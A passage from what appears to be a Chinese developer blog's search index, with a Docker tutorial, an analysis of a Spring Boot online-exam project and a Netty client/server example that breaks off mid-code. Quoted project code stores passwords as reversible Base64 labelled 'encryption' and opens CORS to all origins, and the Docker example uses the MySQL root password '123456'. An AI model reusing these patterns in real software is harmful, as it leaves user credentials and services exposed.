容器基于镜像启动，一旦容器启动完成后，我们就可以登录到容器中安装自己需要的软件或者服务。\nDocker借鉴了标准集装箱的概念。标准集装箱将货物运往世界各地，Docker将这个模型运用到自己的设计中，唯一不同的是：集装箱运输货物，而Docker运输软件。\n和集装箱一样，Docker在执行上述操作时，并不关心容器中到底装了什么，它不管是web服务器，还是数据库，或者是应用程序服务器什么的。所有的容器都按照相同的方式将内容“装载”进去。\nDocker也不关心你要把容器运到何方：我们可以在自己的笔记本中构建容器，上传到Registry，然后下载到一个物理的或者虚拟的服务器来测试，在把容器部署到具体的主机中。像标准集装箱一样，Docker容器方便替换，可以叠加，易于分发，并且尽量通用。\nRegistry（注册中心）Docker用Registry来保存用户构建的镜像。Registry分为公共和私有两种。Docker公司运营公共的Registry叫做Docker Hub。用户可以在Docker Hub注册账号，分享并保存自己的镜像。\n\nDocker安装与启动安装Docker以Centos7为例：\n\nyum 包更新到最新\n\nyum update\n\n\n安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的\n\nyum install -y yum-utils device-mapper-persistent-data lvm2\n\n\n设置yum源为阿里云\n\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n\n\n安装docker\n\nyum install docker-ce\n\n\n安装后查看docker版本\n\ndocker -v\n\n设置ustc的镜像ustc是老牌的linux镜像服务提供者了，还在遥远的ubuntu 5.04版本的时候就在用。ustc的docker镜像加速器速度很快。ustc docker mirror的优势之一就是不需要注册，是真正的公共服务。\n\n创建并编辑文件daemon.json\n\nvi /etc/docker/daemon.json\n\n\n在该文件中输入如下内容\n\n&#123;&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125;\n\nDocker的启动与停止Docker是系统服务，因此使用systemctl系统服务管理器指令来控制Docker:\n\n启动docker\n\nsystemctl start docker\n\n\n停止docker\n\nsystemctl stop docker\n\n\n重启docker\n\nsystemctl restart docker\n\n\n查看docker状态\n\nsystemctl status docker\n\n\n开机启动\n\nsystemctl enable docker\n\n\n查看docker概要信息\n\ndocker info\n\n\n查看docker帮助文档\n\ndocker --help\n\n常用命令\n镜像相关命令\n查看镜像\n\ndocker images\n\n\n\n\n属性\n说明\n\n\n\nREPOSITORY\n镜像名称\n\n\nTAG\n镜像标签\n\n\nIMAGE ID\n镜像ID\n\n\nCREATED\n镜像的创建日期（不是获取该镜像的日期）\n\n\nSIZE\n镜像大小\n\n\n注意：这些镜像都是存储在Docker宿主机的&#x2F;var&#x2F;lib&#x2F;docker目录下。\n\n搜索镜像\n\n如果你需要从网络中查找需要的镜像，可以通过以下命令搜索：\ndocker search 镜像名称\n\n\n\n\n属性\n说明\n\n\n\nNAME\n仓库名称\n\n\nDESCRIPTION\n镜像描述\n\n\nSTARS\n用户评价，反应一个镜像的受欢迎程度\n\n\nOFFICIAL\n是否官方\n\n\nAUTOMATED\n自动构建，表示该镜像由Docker Hub自动构建流程创建的\n\n\n\n拉取镜像\n\n拉取镜像就是从中央仓库中下载镜像到本地：\ndocker pull 镜像名称\n\n例如，下载centos7镜像：\ndocker pull centos:7\n\n\n删除镜像\n\n按镜像ID删除镜像：\ndocker rmi 镜像ID\n\n删除所有镜像：\ndocker rmi `docker images -q`\n\n容器相关命令\n查看容器\n\n查看正在运行的容器：\ndocker ps\n\n查看所有容器：\ndocker ps –a\n\n查看最后一次运行的容器：\ndocker ps –l\n\n查看停止的容器：\ndocker ps -f status=exited\n\n\n创建与启动容器\n创建容器命令：docker run\n创建容器命令中常用的参数说明：\n\n\n\n参数\n说明\n\n\n\n-i\n表示运行容器\n\n\n-t\n表示容器启动后会进入其命令行。加入-i -t两个参数后，容器创建就能登录进去。即分配一个伪终端\n\n\n–name\n为创建的容器命名\n\n\n-v\n表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上\n\n\n-d\n在run后面加上-d参数,则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，创建后就会自动进去容器）\n\n\n-p\n表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射\n\n\n-e\n添加环境变量\n\n\n\n\n（1）以交互式方式创建容器：\ndocker run -it --name=容器名称 镜像名称:标签 /bin/bash\n\n这时我们通过docker ps命令查看，发现可以看到启动的容器，状态为启动状态\n退出当前容器：\nexit\n\n（2）以守护式方式创建容器：\ndocker run -di --name=容器名称 镜像名称:标签\n\n登录守护式容器方式：\ndocker exec -it 容器名称(或者容器ID)  /bin/bash\n\n\n停止与启动容器\n\n停止容器：\ndocker stop 容器名称（或者容器ID）\n\n启动容器：\ndocker start 容器名称（或者容器ID）\n\n\n文件拷贝\n\n如果我们需要将文件拷贝到容器内可以使用cp命令：\ndocker cp 需要拷贝的文件或目录 容器名称:容器目录\n\n也可以将文件从容器内拷贝出来：\ndocker cp 容器名称:容器目录 需要拷贝的文件或目录\n\n\n目录挂载\n\n我们可以在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样我们就可以通过修改宿主机某个目录的文件从而去影响容器。创建容器添加 -v 参数后边为 宿主机目录:容器目录，例如：\ndocker run -di -v /usr/local/myhtml:/usr/local/myhtml --name=mycentos centos:7\n\n如果你共享的是多级的目录，可能会出现权限不足的提示。\n这是因为CentOS7中的安全模块selinux把权限禁掉了，我们需要添加参数 –privileged&#x3D;true 来解决挂载的目录没有权限的问题\n\n查看容器IP地址\n\n我们可以通过以下命令查看容器运行的各种数据：\ndocker inspect 容器名称（容器ID）\n\n也可以直接执行下面的命令直接输出IP地址：\ndocker inspect --format=&#x27;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&#x27; 容器名称（容器ID）\n\n\n删除容器\n\n删除指定的容器：\ndocker rm 容器名称（容器ID）\n\n应用部署MySQL部署\n拉取mysql镜像\n\ndocker pull centos/mysql-57-centos7\n\n\n创建容器\n\ndocker run -di --name=mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql\n\n-p 代表端口映射，格式为 宿主机映射端口:容器运行端口\n-e 代表添加环境变量 MYSQL_ROOT_PASSWORD 是root用户的登陆密码\ntomcat部署\n拉取镜像\n\ndocker pull tomcat:7-jre7\n\n\n创建容器\n\ndocker run -di --name=mytomcat -p 9000:8080 -v /usr/local/webapps:/usr/local/tomcat/webapps tomcat:7-jre7\n\n-v 代表目录映射，格式为 宿主机目录:容器目录\nNginx部署\n拉取镜像\n\ndocker pull nginx\n\n\n创建Nginx容器\n\ndocker run -di --name=mynginx -p 80:80 nginx\n\nRedis部署\n拉取镜像\n\ndocker pull redis\n\n\n创建容器\n\ndocker run -di --name=myredis -p 6379:6379 redis\n\n迁移与备份\n容器保存为镜像\n\ndocker commit 容器名 镜像名\n\n\n镜像备份为tar文件\n\ndocker  save -o 文件名.tar 镜像名\n\n\n镜像恢复与迁移\n\ndocker load -i 文件名.tar\n\n-i 表示输入的文件\nDockerfile什么是DockerfileDockerfile是由一系列命令和参数构成的脚本，这些命令应用于基础镜像并最终创建一个新的镜像。\n1、对于开发人员：可以为开发团队提供一个完全一致的开发环境；2、对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件构建一个新的镜像开始工作了；3、对于运维人员：在部署时，可以实现应用的无缝移植。\n常用命令\n\n\n命令\n作用\n\n\n\nFROM image_name:tag\n定义了使用哪个基础镜像启动构建流程\n\n\nMAINTAINER user_name\n声明镜像的创建者\n\n\nENV key value\n设置环境变量 (可以写多条)\n\n\nRUN command\n是Dockerfile的核心部分(可以写多条)\n\n\nADD source_dir&#x2F;file dest_dir&#x2F;file\n将宿主机的文件复制到容器内，如果是一个压缩文件，将会在复制后自动解压\n\n\nCOPY source_dir&#x2F;file dest_dir&#x2F;file\n和ADD相似，但是如果有压缩文件并不能解压\n\n\nWORKDIR path_dir\n设置工作目录\n\n\n使用Dockerfile创建镜像的例子1、生成requirements.txt\npip install pipreqspipreqs .\n\n2、制作Dockerfile\n#基于的基础镜像FROM python:3.7-slim-buster# 设置code文件夹是工作目录WORKDIR /appCOPY . .# 安装支持RUN pip install -r requirements.txtCMD [&quot;python&quot;, &quot;/app/pose.py&quot;]\n\n3、构建镜像\ndocker build -t liduoandocker .\n\n4、生成对应容器\ndocker run -it liduoandocker\n\nDocker私有仓库私有仓库搭建与配置\n拉取私有仓库镜像\n\ndocker pull registry\n\n私有仓库实际上也是一个容器，创建的操作与普通容器相似。\n\n启动私有仓库容器\n\ndocker run -di --name=registry -p 宿主机端口:映射端口 registry\n\n打开浏览器，输入地址http:&#x2F;&#x2F;宿主机IP: 端口&#x2F;v2&#x2F;_catalog，若看到&#123;&quot;repositories&quot;:[]&#125; 表示私有仓库搭建成功并且内容为空。\n\n修改daemon.json\n\nvi /etc/docker/daemon.json\n\n\n添加以下内容，保存退出。\n\n&#123;&quot;insecure-registries&quot;:[&quot;宿主机IP:仓库端口&quot;]&#125;\n\n此步用于让 docker信任私有仓库地址，其中仓库端口为宿主机端口。\n\n重启docker 服务\n\nsystemctl restart docker\n\n镜像上传至私有仓库\n标记此镜像为私有仓库的镜像\n\ndocker tag 镜像名 宿主机IP:仓库端口/镜像名\n\n\n再次启动私服容器\n\ndocker start registry\n\n\n上传标记的镜像\n\ndocker push 宿主机IP:仓库端口/镜像名\n\n\n下载标记的镜像\n\ndocker pull 宿主机IP:仓库端口/镜像名\n\n","tags":["2021"]},{"title":"online-exam项目分析","url":"/2021/12/01/2021/online-exam%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90/","content":"\n\n简介本文是分析一个项目 \nhttps://gitee.com/lsgwr/spring-boot-online-exam\n大多是我很粗浅的理解\n特点json适配处理在前端传过来的json数据，可能会出现不一致的情况，在这个项目中，使用到了@JsonProperty这个注解来帮助处理\n这个注解是属于fastjson\n@Datapublic class UserInfoVo &#123;    @JsonProperty(&quot;id&quot;)    private String userId;    @JsonProperty(&quot;avatar&quot;)    private String userAvatar;    @JsonProperty(&quot;name&quot;)    private String userNickname;    @JsonProperty(&quot;username&quot;)    private String userUsername;&#125;\n\n\n\n方法内适配大量的方法是放在了service中进行处理\n在注册的方法上\n@Overridepublic User register(RegisterDTO registerDTO) &#123;    try &#123;        User user = new User();        user.setUserId(IdUtil.simpleUUID());        // 好像还缺少个用户名,用&quot;exam_user_手机号&quot;来注册：需要校验唯一性数据字段已经设置unique了，失败会异常地        String defaultUsername = &quot;user&quot;;        user.setUserUsername(defaultUsername + &quot;_&quot; + registerDTO.getMobile());        // 初始化昵称和用户名相同        user.setUserNickname(user.getUserUsername());        // 这里还需要进行加密处理，后续解密用Base64.decode()        user.setUserPassword(Base64.encode(registerDTO.getPassword()));        // 默认设置为学生身份，需要老师和学生身份地话需要管理员修改        user.setUserRoleId(RoleEnum.STUDENT.getId());        // 设置头像图片地址, 先默认一个地址，后面用户可以自己再改        String defaultAvatar = &quot;http://d.lanrentuku.com/down/png/1904/business_avatar/8_avatar_2754583.png&quot;;        user.setUserAvatar(defaultAvatar);        // 设置描述信息，随便设置段默认的        user.setUserDescription(&quot;welcome to online exam system&quot;);        // 需要验证这个邮箱是不是已经存在：数据字段已经设置unique了，失败会异常地        user.setUserEmail(registerDTO.getEmail());        // 需要验证手机号是否已经存在：数据字段已经设置unique了，失败会异常地        user.setUserPhone(registerDTO.getMobile());        userRepository.save(user);        System.out.println(user);        return user;    &#125; catch (Exception e) &#123;        e.printStackTrace(); // 用户已经存在        // 出异常，返回null，表示注册失败        return null;    &#125;&#125;\n\n而在controller层上的处理就较为简单\n@PostMapping(&quot;/register&quot;)@ApiOperation(&quot;注册&quot;)ResultVO&lt;User&gt; register(@RequestBody RegisterDTO registerDTO) &#123;    ResultVO&lt;User&gt; resultVO;    // 注册信息的完善，还有唯一性校验没(用户名、邮箱和手机号)已经在user表中通过unique来设置了    User user = userService.register(registerDTO);    if (user != null) &#123;        // 注册成功        resultVO = new ResultVO&lt;&gt;(ResultEnum.REGISTER_SUCCESS.getCode(), ResultEnum.REGISTER_SUCCESS.getMessage(), user);    &#125; else &#123;        resultVO = new ResultVO&lt;&gt;(ResultEnum.REGISTER_FAILED.getCode(), ResultEnum.REGISTER_FAILED.getMessage(), null);    &#125;    return resultVO;&#125;\n\n仔细想为什么要这样处理\n我认为是service的方法仅仅是为了完成某个处理，某个模块，比如返回注册的结果集。\n至于前端的处理 就应该在controller中进行\nEntity 转 VO这个项目里很喜欢使用BeanUtils来进行处理\n而实际上我们并不建议使用BeanUtils来处理，推荐使用\n\n 一般情况下，同样一个数据模型，我们在不同的层次要使用不同的数据模型。如在数据存储层，我们使用DO来抽象一个业务实体；在业务逻辑层，我们使用DTO来表示数据传输对象；到了展示层，我们又把对象封装成VO来与前端进行交互。\n\n我们先看项目中的代码是如何完成的：\n@Overridepublic List&lt;ExamCardVo&gt; getExamCardList() &#123;    List&lt;Exam&gt; examList = examRepository.findAll();    List&lt;ExamCardVo&gt; examCardVoList = new ArrayList&lt;&gt;();    for (Exam exam : examList) &#123;        ExamCardVo examCardVo = new ExamCardVo();        // 这么喜欢用BeanUtils        BeanUtils.copyProperties(exam, examCardVo);        examCardVoList.add(examCardVo);    &#125;    return examCardVoList;&#125;\n\n这里有一篇文章来诉说MapStruct的使用方法和主要原理\nhttps://juejin.cn/post/6859213877474033672\n具体就是maven–&gt;接口–&gt;转换方法\n处理封装首先是一个Entity和一个VO\n/*********************************************************** * @Description : 考试表，要有题目、总分数、时间限制、有效日期、创建者等字段 * @author      : 梁山广(Laing Shan Guang) * @date        : 2019/5/14 07:42 * @email       : liangshanguang2@gmail.com ***********************************************************/@Entity@Data@DynamicUpdatepublic class Exam &#123;    @Id    private String examId;    private String examName;    private String examAvatar;    private String examDescription;    private String examQuestionIds;    private String examQuestionIdsRadio;    private String examQuestionIdsCheck;    private String examQuestionIdsJudge;    private Integer examScore;    private Integer examScoreRadio;    private Integer examScoreCheck;    private Integer examScoreJudge;    private String examCreatorId;    private Integer examTimeLimit;    @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)    private Date examStartDate;    @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)    private Date examEndDate;    /**     * 创建时间, 设计表时设置了自动插入当前时间，无需在Java代码中设置了     */       @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)    private Date createTime;    /**     * 更新时间，设计表时设置了自动插入当前时间，无需在Java代码中设置了。     * 同时@DynamicUpdate注解可以时间当数据库数据变化时自动更新，无需人工维护     */    @JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;, timezone = &quot;GMT+8&quot;)    private Date updateTime;&#125;\n\n下一个VO\n/*********************************************************** * @Description : 考试详情的实体类 * @author      : 梁山广(Laing Shan Guang) * @date        : 2019-06-24 08:14 * @email       : liangshanguang2@gmail.com ***********************************************************/@Datapublic class ExamDetailVo &#123;    /**     * 考试的基本信息对象     */    private Exam exam;    /**     * 单选题的id数组     */    private String[] radioIds;    /**     * 多选题的id数组     */    private String[] checkIds;    /**     * 判断题的id数组     */    private String[] judgeIds;&#125;\n\n\n\n核心代码\n@Overridepublic ExamDetailVo getExamDetail(String id) &#123;    Exam exam = examRepository.findById(id).orElse(null);    ExamDetailVo examDetailVo = new ExamDetailVo();    // 注入数据    examDetailVo.setExam(exam);    // 我不喜欢这种assert    assert exam != null;    // 继续注入    examDetailVo.setRadioIds(exam.getExamQuestionIdsRadio().split(&quot;-&quot;));    examDetailVo.setCheckIds(exam.getExamQuestionIdsCheck().split(&quot;-&quot;));    examDetailVo.setJudgeIds(exam.getExamQuestionIdsJudge().split(&quot;-&quot;));    return examDetailVo;&#125;\n\n\n\n联合查询该处的处理是依靠多次查询数据库完成的\n@Override    public QuestionDetailVo getQuestionDetail(String id) &#123;        // 初次查询问题详情        Question question = questionRepository.findById(id).orElse(null);        // 往VO注入数据        QuestionDetailVo questionDetailVo = new QuestionDetailVo();        questionDetailVo.setId(id);        questionDetailVo.setName(question.getQuestionName());        questionDetailVo.setDescription(question.getQuestionDescription());        // 问题类型，单选题/多选题/判断题        questionDetailVo.setType(                Objects.requireNonNull(                        questionTypeRepository.findById(                                question.getQuestionTypeId()                        ).orElse(null)                ).getQuestionTypeDescription()        );        // 获取当前问题的选项        String optionIdsStr = trimMiddleLine(question.getQuestionOptionIds());        String[] optionIds = optionIdsStr.split(&quot;-&quot;);        // 获取选项列表        List&lt;QuestionOption&gt; optionList = questionOptionRepository.findAllById(Arrays.asList(optionIds));        questionDetailVo.setOptions(optionList);        return questionDetailVo;    &#125;\n\n这种方式其实很简单，但是我觉得难处在于如何设计，总的来说我们的目的就是完成VO的数据注入。\n跨域处理直接贴代码就是了\n@Configuration@Slf4jpublic class CORSConf &#123;    @Bean    public WebMvcConfigurer corsConfigurer() &#123;        return new WebMvcConfigurer() &#123;            @Override            public void addCorsMappings(CorsRegistry registry) &#123;                log.info(&quot;初始化 CORSConfiguration 配置&quot;);                registry.addMapping(&quot;/**&quot;)                        .allowedHeaders(&quot;*&quot;)                        .allowedMethods(&quot;*&quot;)                        .allowedOrigins(&quot;*&quot;);            &#125;        &#125;;    &#125;&#125;\n\nswagger配置@Configuration@EnableSwagger2public class Swagger2Config &#123;    @Bean    public Docket api() &#123;        ParameterBuilder ticketPar = new ParameterBuilder();        List&lt;Parameter&gt; pars = new ArrayList&lt;&gt;();        ticketPar.name(&quot;Access-Token&quot;).description(&quot;Rest接口权限认证token,无需鉴权可为空&quot;)                .modelRef(new ModelRef(&quot;string&quot;)).parameterType(&quot;header&quot;)                //header中的ticket参数非必填，传空也可以                .required(false).build();        //根据每个方法名也知道当前方法在设置什么参数        pars.add(ticketPar.build());        return new Docket(DocumentationType.SWAGGER_2)                .apiInfo(apiInfo())                .select()                // 自行修改为自己的包路径                .apis(RequestHandlerSelectors.basePackage(&quot;lsgwr&quot;))                .paths(PathSelectors.any())                .build()                .globalOperationParameters(pars);    &#125;    private ApiInfo apiInfo() &#123;        return new ApiInfoBuilder()                .title(&quot;online exam by springboot&quot;)                .description(&quot;在线考试系统 by 梁山广 at 2021&quot;)                .termsOfServiceUrl(&quot;https://github.com/19920625lsg/spring-boot-online-exam&quot;)                .version(&quot;2.0&quot;)                .contact(new Contact(&quot;liangshanguang&quot;, &quot;https://github.com/lsgwr/spring-boot-online-exam&quot;, &quot;liangshanguang2@gmail.com&quot;))                .build();    &#125;&#125;\n\n拦截器处理这里的拦截器是我们想要请求进入后端的时候，我们会校验token\n允许哪些请求可以无token进入\n这个项目的想法是在拦截器中查看请求url如果是登录注册的话，直接返回true\n而实际上大部分的项目是依靠WebMvcConfigurer中使用excludePathPatterns来跳出查看\n/*********************************************************** * @Description : 登录拦截器，主要用于校验Token * @author      : 梁山广(Laing Shan Guang) * @date        : 2019-05-22 07:35 * @email       : liangshanguang2@gmail.com ***********************************************************//** * https://stackoverflow.com/questions/43591582/application-properties-value-in-spring-boot-interceptor * * @author liangshanguang */@Componentpublic class LoginInterceptor implements HandlerInterceptor &#123;    /**     * 有上面的@Component才能使得这个属性能从pplication.yml中取得拦截器的值     */    @Value(&quot;$&#123;interceptors.auth-ignore-uris&#125;&quot;)    private String authIgnoreUris;    /**     * 进入controller之前进行拦截     *     * @param request  请求体     * @param response 响应体     * @param handler  处理者     * @return 是否继续往下走     * @throws Exception 拦截中出的异常     */    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        System.out.println(&quot;进入拦截器啦！&quot;);        String uri = request.getRequestURI();        System.out.println(uri);        System.out.println(&quot;无需拦截的接口路径：&quot; + authIgnoreUris);        String[] authIgnoreUriArr = authIgnoreUris.split(&quot;,&quot;);        // 登录和注册接口不需要进行token拦截和校验        for (String authIgnoreUri : authIgnoreUriArr) &#123;            if (authIgnoreUri.equals(uri)) &#123;                return true;            &#125;        &#125;        // 注意要和前端适配Access-Token属性，前端会在登陆后的每个接口请求头加Access-Token属性        String token = request.getHeader(&quot;Access-Token&quot;);        if (token == null) &#123;            // token不在header中时，也可能在参数中(RequestParam)            token = request.getParameter(&quot;token&quot;);        &#125;        if (token != null) &#123;            // 请求中是携带参数的            Claims claims = JwtUtils.checkJWT(token);            if (claims == null) &#123;                // 返回null说明用户篡改了token，导致校验失败                sendJsonMessage(response, JsonData.buildError(&quot;token无效，请重新登录&quot;));                return false;            &#125;            // 用户的的主键id            String id = (String) claims.get(&quot;id&quot;);            // 用户名            String username = (String) claims.get(&quot;username&quot;);            // 把这两个参数放到请求中，从而可以在controller中获取到，不需要在controller中在用Jwt解密了,request.getAttribute(&quot;属性名&quot;)即可获取            request.setAttribute(&quot;user_id&quot;, id);            request.setAttribute(&quot;username&quot;, username);            return true;        &#125;        sendJsonMessage(response, JsonData.buildError(&quot;token为null,请先登录！&quot;));        return false;    &#125;    /**     * 响应数据给前端     *     * @param response 响应     * @param obj      返回的消息体     * @throws Exception 处理异常     */    public static void sendJsonMessage(HttpServletResponse response, Object obj) throws Exception &#123;        Gson g = new Gson();        response.setContentType(&quot;application/json; charset=utf-8&quot;);        PrintWriter writer = response.getWriter();        writer.print(g.toJson(obj));        writer.close();        response.flushBuffer();    &#125;&#125;\n\n补充下WebMvcConfigurer\n@Configurationpublic class IntercepterConfig implements WebMvcConfigurer &#123;    @Autowired    private LoginInterceptor loginInterceptor;    @Override    public void addInterceptors(InterceptorRegistry registry) &#123;        // 拦截user下的api        registry.addInterceptor(loginInterceptor)            .addPathPatterns(&quot;/api/**&quot;)            .excludePathPatterns(&quot;&quot;);    &#125;&#125;\n\n","tags":["2021"]},{"title":"Netty","url":"/2021/10/29/2021/netty/","content":"\n\nNetty简介NIO 的类库和 API 繁杂、使用麻烦，需要熟练掌握Selector、ServerSocketChannel、SocketChannel、ByteBuffer等API的使用。 除此之外，NIO开发工作量和难度都非常大，例如客户端面临断线重连、网络闪断、心跳处理、半包读写、 网络拥塞和异常流的处理等等。\nNetty 对 JDK 自带的 NIO 的 API 进行了良好的封装，解决了上述问题。且Netty拥有高性能、 吞吐量更高、延迟更低、减少资源消耗、最小化不必要的内存复制等优点。Netty 现在都在用的是4.x，5.x版本已经废弃，Netty 4.x 需要JDK 6以上版本支持。\nNetty简单案例首先在项目中引入依赖：\n&lt;dependency&gt;   &lt;groupId&gt;io.netty&lt;/groupId&gt;   &lt;artifactId&gt;netty-all&lt;/artifactId&gt;   &lt;version&gt;4.1.48.Final&lt;/version&gt;&lt;/dependency&gt;\n\n服务端首先编写服务端代码：\npublic class NettyServer &#123;    public static void main(String[] args) throws Exception &#123;        // 个线程组bossGroup和workerGroup，它们相当于线程池        // 有的子线程NioEventLoop的个数默认为cpu核数的两倍        // bossGroup只是处理连接请求，真正的和客户端的读写业务会交给workerGroup处理        EventLoopGroup bossGroup = new NioEventLoopGroup(1);        EventLoopGroup workerGroup = new NioEventLoopGroup();        try &#123;            // 创建服务器端的启动对象            ServerBootstrap bootstrap = new ServerBootstrap();            // 使用链式编程来配置参数            // 设置两个线程组            bootstrap.group(bossGroup, workerGroup)                      //使用NioServerSocketChannel作为服务器的通道实现                    .channel(NioServerSocketChannel.class)                      /* 初始化服务器连接队列大小，服务端处理客户端连接请求是顺序处理的,                        所以同一时间只能处理一个客户端连接。多个客户端同时来的时候,                        服务端将不能处理的客户端连接请求放在队列中等待处理*/                    .option(ChannelOption.SO_BACKLOG, 1024)                     // 创建通道初始化对象，设置初始化参数                    .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() &#123;                        @Override                        protected void initChannel(SocketChannel ch) throws Exception &#123;                            // 对workerGroup中的SocketChannel的管道pipline中添加处理器                            ch.pipeline().addLast(new NettyServerHandler());                        &#125;                    &#125;);            System.out.println(&quot;netty server start。。&quot;);                        /* bind方法异步绑定, 生成了一个ChannelFuture异步对象，               通过isDone等方法可以判断异步事件的执行情况。               bind是异步操作，通过sync方法是等待异步操作执行完毕*/            // 这里也是绑定的处理逻辑            ChannelFuture cf = bootstrap.bind(8888).sync();            // 可以给ChannelFuture注册监听器，监听我们关心的事件            /*cf.addListener(new ChannelFutureListener() &#123;                @Override                public void operationComplete(ChannelFuture future) throws Exception &#123;                    if (cf.isSuccess()) &#123;                        System.out.println(&quot;监听端口8888成功&quot;);                    &#125; else &#123;                        System.out.println(&quot;监听端口8888失败&quot;);                    &#125;                &#125;            &#125;);*/                        /* 对通道关闭进行监听，closeFuture是异步操作，监听通道关闭               通过sync方法同步等待通道关闭处理完毕，这里会阻塞等待通道关闭完成*/            // 阻塞住了            cf.channel().closeFuture().sync();        &#125; finally &#123;            // 关闭两个NioEventLoopGroup            bossGroup.shutdownGracefully();            workerGroup.shutdownGracefully();        &#125;    &#125;&#125;\n\n其中的处理器代码如下：\n/** * 自定义的Handler需要继承netty中规定好的某个HandlerAdapter * 其中可以重写很多方法，根据需要选择几个方法重写 */public class NettyServerHandler extends ChannelInboundHandlerAdapter &#123;    /**     * 读取客户端发送的数据     * @param ctx 上下文对象, 含有通道channel，管道pipeline     * @param msg 就是客户端发送的数据     * @throws Exception     */    @Override    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception &#123;        System.out.println(&quot;服务器读取线程 &quot; + Thread.currentThread().getName());                //Channel channel = ctx.channel();        //ChannelPipeline pipeline = ctx.pipeline(); //本质是一个双向链接, 出站入站                //将msg转成一个ByteBuf，类似NIO中的ByteBuffer        ByteBuf buf = (ByteBuf) msg;        System.out.println(&quot;客户端发送消息是:&quot; + buf.toString(CharsetUtil.UTF_8));    &#125;    /**     * 数据读取完毕处理方法     * @param ctx     * @throws Exception     */    @Override    public void channelReadComplete(ChannelHandlerContext ctx) throws Exception &#123;        // 构建消息        ByteBuf buf = Unpooled.copiedBuffer(&quot;HelloClient&quot;, CharsetUtil.UTF_8);        // 通过上下文对象将消息发送给客户端        ctx.writeAndFlush(buf);    &#125;    /**     * 处理异常, 一般是需要关闭通道     * @param ctx     * @param cause     * @throws Exception     */    @Override    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception &#123;        ctx.close();    &#125;&#125;\n\n客户端接着编写客户端代码：\npublic class NettyClient &#123;    public static void main(String[] args) throws Exception &#123;        // 客户端只需要一个事件循环组NioEventLoopGroup        EventLoopGroup group = new NioEventLoopGroup();        try &#123;            // 创建客户端启动对象，和服务端的不一样            Bootstrap bootstrap = new Bootstrap();            // 设置相关参数            // //设置线程组            bootstrap.group(group)                      // 使用NioSocketChannel作为客户端的通道实现                    .channel(NioSocketChannel.class)                      // 创建通道初始化对象，设置初始化参数                    .handler(new ChannelInitializer&lt;SocketChannel&gt;() &#123;                        @Override                        protected void initChannel(SocketChannel channel)                             throws Exception &#123;                            // 向SocketChannel的管道pipline中添加处理器                            channel.pipeline().addLast(new NettyClientHandler());                        &#125;                    &#125;);            System.out.println(&quot;netty client start&quot;);            //这里都是在等待结果，保证程序不宕掉            // 启动客户端去连接服务器端            ChannelFuture channelFuture = bootstrap.connect(&quot;127.0.0.1&quot;, 9000).sync();            // 对关闭通道进行监听            channelFuture.channel().closeFuture().sync();        &#125; finally &#123;            // 关闭NioEventLoopGroup            group.shutdownGracefully();        &#125;    &#125;&#125;\n\n其中的处理器代码如下：\npublic class NettyClientHandler extends ChannelInboundHandlerAdapter &#123;    /**     * 当客户端连接服务器完成就会触发该方法     * @param ctx     * @throws Exception     */    @Override    public void channelActive(ChannelHandlerContext ctx) throws Exception &#123;        ByteBuf buf = Unpooled.copiedBuffer(&quot;HelloServer&quot;, CharsetUtil.UTF_8);        ctx.writeAndFlush(buf);    &#125;   /**     * 当通道有读取事件时会触发，即服务端发送数据给客户端     * @param ctx 上下文对象, 含有通道channel，管道pipeline     * @param msg 就是客户端发送的数据     * @throws Exception     */    @Override    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception &#123;        ByteBuf buf = (ByteBuf) msg;        System.out.println(&quot;收到服务端的消息:&quot; + buf.toString(CharsetUtil.UTF_8));        System.out.println(&quot;服务端的地址： &quot; + ctx.channel().remoteAddress());    &#125;    // 异常情况出现关闭连接    @Override    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception &#123;        cause.printStackTrace();        ctx.close();    